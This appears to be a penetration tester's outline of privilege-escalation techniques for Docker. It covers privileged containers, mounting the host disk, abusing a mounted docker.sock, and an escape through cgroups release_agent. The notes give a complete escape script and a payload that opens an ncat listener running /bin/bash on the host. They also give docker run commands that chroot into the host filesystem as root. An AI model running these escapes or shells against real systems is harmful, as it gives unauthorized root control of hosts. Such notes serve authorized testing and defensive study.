Privesc with Docker access

	With docker group access, root should be straightforward
		create priv container (see ii. Gaining Access)
			privileged containers can be used to gain rights on underlying host
				mount host filesystems into a container - can be used to modify system files

	Containers running as privileged
		enables all access to all devices on the host

		mount host filesystem into container
			docker run -it --privileged <image_name> /bin/sh
			mount 		(find underlying host disk path)
			mkdir /rootfs
			mount </dev/root_disk_name> /rootfs

		arbitrary command execution on host (using cgroups release_agent)
			create escape.sh shell script: 
				d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
				mkdir -p $d/w;echo 1 >$d/w/notify_on_release
				t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
				touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
				$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
			use script to execute a payload (e.g. netcat listener shell)
				./escape.sh "apt install nmap -y; ncat -l 9999 -e /bin/bash"

	Docker.sock mounted into container
		typically done for monitoring and container management
		dangerous to effectively access docker.sock as root

		gain root on host:
			docker run -it -v /var/run/docker.sock:/var/run/docker.sock <image_name> /bin/ash
			within run container:
				docker run -it --privileged --net=host --pid=host --ipc=host --volume /:/host <image_name> chroot /host
					this container now acts effectively as root on the host

